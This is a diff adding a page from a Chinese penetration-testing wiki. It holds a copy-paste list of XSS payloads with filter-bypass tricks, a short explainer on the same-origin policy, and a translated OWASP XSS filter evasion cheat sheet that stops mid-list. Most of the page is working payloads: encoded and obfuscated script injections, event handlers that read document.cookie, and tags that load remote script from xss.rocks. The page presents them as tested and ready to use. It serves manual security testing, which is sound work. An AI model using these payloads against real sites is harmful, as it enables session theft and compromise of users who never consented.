@@ -1,0 +1,1034 @@
+<!doctype html>
+<html class="no-js" lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <link rel="bookmark" href="https://raw.githubusercontent.com/AlShelley/lonelyorWiki/master/asset/img/favicon.ico" type="images/x-icon"/>
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/AlShelley/lonelyorWiki/master/asset/img/favicon.ico" type="images/x-icon"/>
+
+    <title>
+    
+  渗透测试 - lonelyorWiki
+  
+  </title>
+  
+  
+  <link href="atom.xml" rel="alternate" title="lonelyorWiki" type="application/atom+xml">
+    <link rel="stylesheet" href="asset/css/foundation.min.css" />
+    <link rel="stylesheet" href="asset/css/docs.css" />
+    <script src="asset/js/vendor/modernizr.js"></script>
+    <script src="asset/js/vendor/jquery.js"></script>
+  <script src="asset/highlightjs/highlight.pack.js"></script>
+  <link href="asset/highlightjs/styles/github.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script>hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+  function before_search(){
+    var searchVal = 'site:www.lonelyor.org/lonelyorWiki ' + document.getElementById('search_input').value;
+    document.getElementById('search_q').value = searchVal;
+    return true;
+  }
+</script>
+  </head>
+  <body class="antialiased hide-extras">
+    
+    <div class="marketing off-canvas-wrap" data-offcanvas>
+      <div class="inner-wrap">
+
+
+<nav class="top-bar docs-bar hide-for-small" data-topbar>
+
+
+  <section class="top-bar-section">
+  <div class="row">
+      <div style="position: relative;width:100%;"><div style="position: absolute; width:100%;">
+        <ul id="main-menu" class="left">
+        
+        <li id=""><a target="_self" href="index.html">首页</a></li>
+        
+        <li id=""><a target="_self" href="archives.html">归档</a></li>
+        
+        <li id=""><a target="_self" href="beautiful.html">惊鸿</a></li>
+        
+        <li id=""><a target="_self" href="ruby.html">流光</a></li>
+        
+        <li id=""><a target="_self" href="search.html">北斗</a></li>
+        
+        <li id=""><a target="_self" href="lose.html">失乐园</a></li>
+        
+        <li id=""><a target="_self" href="about.html">关于</a></li>
+        
+        </ul>
+
+        <ul class="right" id="search-wrap">
+          <li>
+<form target="_blank" onsubmit="return before_search();" action="https://google.com/search" method="get">
+    <input type="hidden" id="search_q" name="q" value="" />
+    <input tabindex="1" type="search" id="search_input"  placeholder="Search"/>
+</form>
+</li>
+          </ul>
+      </div></div>
+  </div>
+  </section>
+
+</nav>
+
+        <nav class="tab-bar show-for-small">
+  <a href="javascript:void(0)" class="left-off-canvas-toggle menu-icon">
+    <span> &nbsp; lonelyorWiki</span>
+  </a>
+</nav>
+
+<aside class="left-off-canvas-menu">
+      <ul class="off-canvas-list">
+        
+        <li><a target="_self" href="index.html">首页</a></li>
+        
+        <li><a target="_self" href="archives.html">归档</a></li>
+        
+        <li><a target="_self" href="beautiful.html">惊鸿</a></li>
+        
+        <li><a target="_self" href="ruby.html">流光</a></li>
+        
+        <li><a target="_self" href="search.html">北斗</a></li>
+        
+        <li><a target="_self" href="lose.html">失乐园</a></li>
+        
+        <li><a target="_self" href="about.html">关于</a></li>
+        
+
+    <li><label>Categories</label></li>
+
+        
+            <li><a href="%E7%B3%BB%E7%BB%9F.html">系统</a></li>
+        
+            <li><a href="%E7%BD%91%E7%BB%9C.html">网络</a></li>
+        
+            <li><a href="%E5%BC%80%E5%8F%91.html">开发</a></li>
+        
+            <li><a href="%E5%B7%A5%E5%85%B7.html">工具</a></li>
+        
+            <li><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">渗透测试</a></li>
+        
+            <li><a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html">风花雪月</a></li>
+        
+            <li><a href="%E6%98%9F%E7%81%AB%E6%B5%81%E8%90%A4.html">星火流萤</a></li>
+         
+
+      </ul>
+    </aside>
+
+<a class="exit-off-canvas" href="#"></a>
+
+
+        <section id="main-content" role="main" class="scroll-container">
+        
+       
+
+ <script type="text/javascript">
+	$(function(){
+		$('#menu_item_index').addClass('is_active');
+	});
+</script>
+<div class="row">
+	<div class="large-8 medium-8 columns">
+		<div class="markdown-body home-categories">
+		
+			<div class="article">
+                <a class="clearlink" href="15446893463166.html">
+                
+                  <h1>xss常用payload</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>这是很久之前写的东西了，忘记是从哪里收集总结来的了。抱歉没法贴源地址了。</p>
+</blockquote>
+
+<p>在平时的工作中，经常遇到需要手工测试xss漏洞的地方，每次都将代码输入一遍（特别是用手机的时候）会显得比较麻烦，因此写这篇文档来记录一下平时可能用到的xss攻击代码，以备不时之需，复制粘贴总比打字方便一些。以下部分代码收集自网络（全部测试过，可以直接使用）。</p>
+
+<p>xss漏洞是常见的web安全问题之一，当网站未做任何防御时，输入<script>alert(‘xss’)</script>就会弹出上述弹窗。但是通常情况下，网站都会对一些字符进行过滤，以预防xss攻击，这时就需要运用到一些xss绕过技巧。</p>
+
+<p>1.大小写混合绕过<br/>
+顾名思义，通过修改攻击代码大小写进行绕过。虽然javascript对大小写敏感但是html不敏感，javascript操作html的标签不敏感。代码示例：<code>&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;</code></p>
+
+<p>2.闭合标签绕过</p>
+
+<p>单引号很多时候都能起到闭合语句的作用，有时候我们通过关闭标签可以使xss生效。</p>
+
+<p>3.HEX编码来绕过</p>
+
+<p>对语句进行Hex编码，如<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为<code>3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</code></p>
+
+<p>4.Javascript URL</p>
+
+<p>链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</p>
+
+<p><code>&lt;a href=”javascript:alert(‘test’)”&gt;link&lt;/a&gt;</code></p>
+
+<p>稍微高级一点的写法还有：<code>&lt;a href=”javascript:alert(‘xss’)”&gt;link&lt;/a&gt;</code>，通过url编码使它依旧可以被浏览器执行但又不匹配正则表达式。</p>
+
+<p>5.根据之前绕过方法的启发，我们可以通过修改标签和编码或者函数来修改所用的攻击代码</p>
+
+<p>===&gt;常用代码如下：</p>
+
+<p><code>&lt;script&gt;alert(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
+
+<p><code>&lt;script&gt;confirm(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;prompt(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script src=data:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
+
+<p><code>&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;alert(/8888/.source)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;setTimeout(alert(8888),0)&lt;/script&gt;</code></p>
+
+<p>===&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</p>
+
+<p><code>&lt;anytag onmouseover=alert(1)&gt;h</code></p>
+
+<p><code>&lt;anytag onclick=alert(2)&gt;h</code></p>
+
+<p><code>&lt;a onmouseover=alert(3)&gt;h</code></p>
+
+<p><code>&lt;a onclick=alert(4)&gt;h</code></p>
+
+<p><code>&lt;a href=javascript:alert(5)&gt;h</code></p>
+
+<p><code>&lt;button/onclick=alert(6)&gt;h</code></p>
+
+<p><code>formaction=javascript&amp;colon;alert(7)&gt;h</code></p>
+
+<p><code>&lt;form/action=javascript:alert(8)&gt;&lt;input/type=submit&gt;</code></p>
+
+<p><code>&lt;form onsubmit=alert(9)&gt;&lt;button&gt;h</code></p>
+
+<p><code>&lt;form onsubmit=alert(10)&gt;&lt;button&gt;h</code></p>
+
+<p><code>&lt;img src=x onerror=alert(11)&gt; 29</code></p>
+
+<p><code>&lt;body/onload=alert(12)&gt;</code></p>
+
+<p><code>&lt;body onscroll=alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></p>
+
+<p><code>&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</code></p>
+
+<p><code>&lt;IFRAME SRC=”javascript:alert(14);”&gt;&lt;/IFRAME&gt;</code></p>
+
+<p><code>&lt;meta http-equiv=”refresh” content=”0;</code></p>
+
+<p><code>url=data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;”&gt;</code></p>
+
+<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</code>　　　　＃此为base64编码，有兴趣可以试试其他编码方式</p>
+
+<p><code>&lt;input onfocus=alert(16) autofocus&gt;</code>　　　　＃使用这行攻击代码会无限弹xss</p>
+
+<p><code>&lt;input onblur=alert(17) autofocus&gt;&lt;input autofocus&gt;</code></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 16:22 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446892905759.html">
+                
+                  <h1>同源策略</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>摘自网络，出处忘了。</p>
+</blockquote>
+
+<p>同源策略（SOP，Same Origin Policy），两个页面的【协议】【域名】【端口】都相同，则两个页面具有相同的源，任何一个不同都是不同源的。<br/>
+举例：<br/>
+假设源是：<code>http://store.company.com/dir/page.html</code><br/>
+同源的是：<br/>
+<code>http://store.company.com/dir2/other.html</code><br/>
+<code>http://store.company.com/dir/inner/another.html</code><br/>
+不同源的是：<br/>
+<code>https://store.company.com/secure.html</code> 不同协议 ( https和http )<br/>
+<code>http://store.company.com:81/dir/etc.html</code> 不同端口 ( 81和80)<br/>
+<code>http://news.company.com/dir/other.html</code> 不同域名 ( news和store )</p>
+
+<h2 id="toc_0">同源策略控制内容</h2>
+
+<p><em>同源策略是禁止读取HTTP回复，并不会禁止脚本执行，也不会禁止HTTP请求，因此在防御CSRF上作用是非常有限的，因为CSRF在请求发出的时候就已经达到了攻击的目的。</em><br/>
+一般情况下，静态资源通常不受同源策略限制，如有js/css/jpg/png等。</p>
+
+<p>同源策略控制了不同源之间的交互，例如在使用<code>XMLHttpRequest</code>或<code>img</code>标签时则会受到同源策略的约束，这些交互通常分为三类。</p>
+
+<ul>
+<li>通常允许跨域写（Cross-origin writes），例如链接（links），重定向以及表单提交。少数特定的HTTP请求需要添加&quot;预检请求&quot;<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests">preflight</a>如OPTIONS来查询可用的方法。</li>
+<li>通常允许跨域资源嵌入（Cross-origin embedding）</li>
+<li>通常 <strong>不允许</strong> 跨域读（Cross-origin reads），但常可以通过内嵌资源来巧妙的进行读取访问。例如可以读取嵌入图片的高度和宽度，调用内嵌脚本的方法，或<a href="https://www.grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">availability of an embedded resource</a></li>
+</ul>
+
+<p>下面是可能嵌入跨域资源的示例：<br/>
+<code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。<br/>
+<code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的<a href="http://scarybeastsecurity.blogspot.dk/2009/12/generic-cross-browser-cross-domain.html">松散的语法规则</a>，CSS的跨域需要一个设置正确的Content-Type 消息头。不同浏览器有不同的限制： <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622939(v=vs.85)">IE</a>, <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2010-46/">Firefox</a>, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=9877">Chrome</a>, <a href="https://support.apple.com/zh-cn/HT4070">Safari</a> (跳至CVE-2010-0051)部分 和 <a href="https://security.opera.com/">Opera</a>。<br/>
+<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img"><code>&lt;img&gt;</code></a>嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...<br/>
+<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video"><code>&lt;video&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio"><code>&lt;audio&gt;</code></a>嵌入多媒体资源。<br/>
+<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/object"><code>&lt;object&gt;</code></a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed"><code>&lt;embed&gt;</code></a> 和 <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet"><code>&lt;applet&gt;</code></a> 的插件。<br/>
+<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@font-face">@font-face</a> 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。<br/>
+<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame"><code>&lt;frame&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe"><code>&lt;iframe&gt;</code></a> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 16:21 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446891028198.html">
+                
+                  <h1>xss测试备忘录</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>description: 此备忘录来自：<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a><br/>
+列出了一系列可用于绕过某些XSS防御过滤器的XSS攻击。</p>
+</blockquote>
+
+<ul>
+<li><p>最基本的payload</p>
+<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;</code></p></li>
+<li><p>xss定位</p>
+<p>这个测试将在包含html、js、url、script string等多个上线文中执行</p>
+<p><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;/[]/+alert(1)//&#39;&gt;</code></p></li>
+<li><p>图像xss</p>
+<p><code>&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
+<li><p>没有引号和分号</p>
+<p><code>&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;</code></p></li>
+<li><p>不区分大小写</p>
+<p><code>&lt;IMG SRC=JaVaScRiPt:alert(&#39;XSS&#39;)&gt;</code></p></li>
+<li><p>html实体编码</p>
+<p><code>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</code></p></li>
+<li><p>重音符(esc下面tab上面那个符号)</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#39;XSS&#39;&quot;)`&gt;
+</code></pre></li>
+<li><p>错误的a标签</p>
+<p><code>&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;</code></p>
+<p>chrome喜欢替换丢失的引号</p>
+<p><code>&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;</code></p></li>
+<li><p>错误的img标签</p>
+<p><code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code></p></li>
+<li><p>fromCharCode()方法(根据Unicode值显示字符串)</p>
+<p><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></p></li>
+<li><p>默认src标签，用于检查src过滤器</p>
+<p>这能绕过大多数src过滤器。在事件方法中插入javascript也适用于使用 form、iframe、input、embed等元素的任何htm标记类型注入，它还允许替换标记类型的任何相关事件，如onblur、onlick</p>
+<p><code>&lt;IMG SRC=# onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;</code></p></li>
+<li><p>将默认src留空</p>
+<p><code>&lt;IMG SRC= onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;</code></p></li>
+<li><p>完全不使用默认src</p>
+<p><code>&lt;IMG onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;</code></p></li>
+<li><p>出错时提示</p>
+<p><code>&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;</code></p>
+<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
+<p>js编码</p>
+<p><code>&lt;img src=x onerror=&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&quot;&gt;</code></p></li>
+<li><p>十进制html字符引用</p>
+<p>所有在img标签中使用javascript代码的xss示例，在Gecko渲染引擎模式下都无法在Firefox或Netscape 8.1+ 中使用。</p>
+<pre class="line-numbers"><code class="language-markup">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
+&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+</code></pre>
+<p>变种(不带分号)</p>
+<p>通常在过滤 &#xxx; 的情况下有效</p>
+<p>过滤的写法——<code>$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/;</code></p>
+<pre class="line-numbers"><code class="language-markup">&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;
+#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+</code></pre></li>
+<li><p>十六进制html字符引用，不带分号</p>
+<p><code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</code></p></li>
+<li><p>嵌入式标签</p>
+<p><code>&lt;IMG SRC=&quot;jav    ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
+<p>变种(编码)</p>
+<p>水平标签</p>
+<p><code>&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
+<p>换行符</p>
+<p><code>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
+<p>回车符</p>
+<p><code>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
+<li><p>null字符或者%00</p>
+<p>可以在终端使用以下代码生成 xss payload</p>
+<p><code>perl -e &#39;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#39; &gt; out</code></p>
+<p>如下：</p>
+<p><code>&lt;IMG SRC=java^@script:alert(&quot;XSS&quot;)&gt;</code></p></li>
+<li><p>空格和元字符在 javascript代码在图像中作为 xss payload之前</p>
+<p><code>&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p></li>
+<li><p>非字母非数字的xss</p>
+<p><code>&lt;SCRIPT/XSS SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code></p>
+<p>变种(Gecko渲染引擎允许在<em>事件处理程序和等号之间</em>使用除字母，数字或封装字符（如引号，尖括号等等）之外的任何字符)</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+</code></pre>
+<p>IE只允许标记和参数之间是不带空格的斜杠</p>
+<p><code>&lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code></p></li>
+<li><p>无关的开放式括号</p>
+<p>某些检测引擎会首先使用匹配的开启和关闭尖括号对，然后通过内部标记进行比较；双斜杠注释掉结束的无关括号以阻止javascript错误。</p>
+<p><code>&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT</code></p></li>
+<li><p>没有关闭脚本标签</p>
+<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;</code></p>
+<p>变种(半开html/javascript标签)</p>
+<p>半开的标签会扰乱html逻辑，影响payload后面的html，可以用来绕过NIDS正则表达式<code>/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/</code></p>
+<p><code>&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;</code></p>
+<p>变种(双开标签)</p>
+<p>firefox会受影响，netscape不会</p>
+<p><code>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;</code></p></li>
+<li><p>javascript逃逸</p>
+<p>当输出javascript中的信息的代码这样写<code>&lt;SCRIPT&gt;var a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/SCRIPT&gt;</code>并且想要将自己的javascript代码注入服务器端应用程序并逃脱某些引用时，可以通过逃避转移字符来规避它。当以下代码注入时，会被读取为<code>&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&#39;XSS&#39;);//&quot;;&lt;/SCRIPT&gt;</code></p>
+<p>拆开解读：</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;SCRIPT&gt;
+var a=&quot;\\&quot;;    合并前面的双引号<br/>
+alert(&#39;XSS&#39;);<br/>
+//&quot;;<br/>
+&lt;/SCRIPT&gt;    转义后面的双引号
+</code></pre>
+<p><code>\&quot;;alert(&#39;XSS&#39;);//</code></p>
+<p>另一种方法，如果嵌入的数据应用了对的json或javascript转义，而不是html编码，则</p>
+<p><code>&lt;/script&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></p></li>
+<li><p>html标签常规属性或方法</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;<br/>
+&lt;BODY BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
+&lt;IMG DYNSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
+&lt;IMG LOWSRC=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
+&lt;svg/onload=alert(&#39;XSS&#39;)&gt;<br/>
+&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;    这里还可以在等号后面加一个空格， (&quot;onload=&quot; 不等于 &quot;onload =&quot;)
+</code></pre></li>
+<li><p>img标签中使用VBscript</p>
+<pre class="line-numbers"><code class="language-&lt;img"></code></pre></li>
+<li><p>ECMAScript 6</p>
+<pre class="line-numbers"><code class="language-javascript">Set.constructor`alert \ x28document.domain \ x29
+</code></pre></li>
+<li><p>其他不常见的标签</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;BGSOUND SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;
+&lt;BR SIZE=&quot;&amp;{alert(&#39;XSS&#39;)}&quot;&gt;<br/>
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;    适用于IE<br/>
+&lt;STYLE&gt;@import&#39;http://xss.rocks/xss.css&#39;;&lt;/STYLE&gt;    用于google桌面，不能使用斜杠或等号的时候，这个payload很有用<br/>
+&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet&quot;&gt;<br/>
+&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://xss.rocks/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;    仅适用于Gecko渲染引擎<br/>
+&lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt;    这个xss有时会将ie发送到无限循环的警报中<br/>
+&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))&quot;&gt;    由罗曼伊万诺夫创建<br/>
+exp/*&lt;A STYLE=&#39;no\xss:noxss(&quot;*//*&quot;);xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#39;&gt;     混合表达式，可以将ie发送到无限循环中<br/>
+&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;  使用背景图像的style标签<br/>
+&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt;    使用背景的style标记<br/>
+&lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/IFRAME&gt;<br/>
+&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;<br/>
+&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/FRAMESET&gt;<br/>
+&lt;TABLE BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
+&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;<br/>
+&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt;<br/>
+&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://xss.rocks/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;  这里可以注入病毒<br/>
+EMBED SRC=&quot;http://ha.ckers.Using EMBED标签你可以嵌入一个包含XSS的Flash电影。点击这里进行演示。如果添加属性 allowScriptAccess=&quot;never&quot; and allownetworking=&quot;internal&quot; 它可以减轻这种风险(感谢Jonathan Vanasco提供的信息).:<br/>
+org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;    可以嵌入flash影片<br/>
+&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;    这个仅适用于火狐<br/>
+a=&quot;get&quot;;<br/>
+b=&quot;URL(\&quot;&quot;;<br/>
+c=&quot;javascript:&quot;;<br/>
+d=&quot;alert(&#39;XSS&#39;);\&quot;)&quot;;<br/>
+eval(a+b+c+d);    <br/>
+可以使用actionscript模糊xss payload<br/>
+&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;<br/>
+&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;    适合IE<br/>
+&lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;<br/>
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;<br/>
+&lt;HTML&gt;&lt;BODY&gt;<br/>
